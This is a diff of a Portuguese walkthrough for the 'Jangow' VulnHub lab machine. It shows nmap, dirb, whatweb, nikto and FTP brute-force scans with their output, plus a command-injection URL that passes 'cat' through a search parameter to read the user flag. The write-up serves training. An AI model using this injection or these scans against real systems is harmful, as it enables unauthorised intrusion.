@@ -4,11 +4,15 @@ https://www.vulnhub.com/entry/jangow-101,754/
 
 Adicione o endereço IP do alvo no arquivo hosts para que seu SO resolva o nome "jangow"
 
+
+
 <h2>⇒ Scanning </h2>
 
 Escaneando as portas do alvo:
 
-```nmap -sC -sV -vv -oA quick jangow -oN nmap-all.txt```
+~~~
+nmap -sC -sV -vv -oA quick jangow -oN nmap-all.txt
+~~~
 
 ~~~
 # Nmap 7.92 scan initiated Tue Nov  2 12:06:03 2021 as: nmap -sC -sV -vv -oA quick -oN nmap-all.txt jangow
@@ -27,10 +31,13 @@ Service Info: Host: 127.0.0.1; OS: Unix
 
 
 <h2>⇒ Enumeração </h2>
- web 80:
+ WEB Port 80:
 
-```dirb http://jangow:80 /usr/share/dirb/wordlists/big.txt | tee dirb80.txt```
+~~~
+dirb http://jangow:80 /usr/share/dirb/wordlists/big.txt | tee dirb80.txt
+~~~
 
+Output:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 URL_BASE: http://jangow:80/
 WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
@@ -70,15 +77,19 @@ DOWNLOADED: 61374 - FOUND: 1
 
 
 
-```whatweb http://jangow``` 
-
+~~~
+whatweb http://jangow
+~~~ 
+Output:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 http://jangow [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.122.127], Index-Of, Title[Index of /]
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
-```nikto -h jangow```
-
+~~~
+nikto -h jangow
+~~~
+Output:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -114,9 +125,12 @@ http://jangow [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
- FTP 21:
 
-```nmap -p 21 -A -sV -sC jangow```
+ FTP Port 21:
+
+~~~
+nmap -p 21 -A -sV -sC jangow
+~~~
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 PORT   STATE SERVICE VERSION
@@ -138,8 +152,10 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 7.54 seconds
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-```nmap -p 21 --script ftp-* jangow```
-
+~~~
+nmap -p 21 --script ftp-* jangow
+~~~
+Output:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-02 20:27 -04
 NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
@@ -158,11 +174,13 @@ MAC Address: 52:54:00:36:85:5E (QEMU virtual NIC)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
+
 <h2>⇒ (Exploração/Ataque) </h2> 
 
 ![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/url_expl.png)
 
 Flag User:
+![alt text](path/to/file)
 
 http://jangow/site/busque.php?buscar=cat%20/home/jangow01/user.txt
 d41d8cd98f00b204e9800998ecf8427e
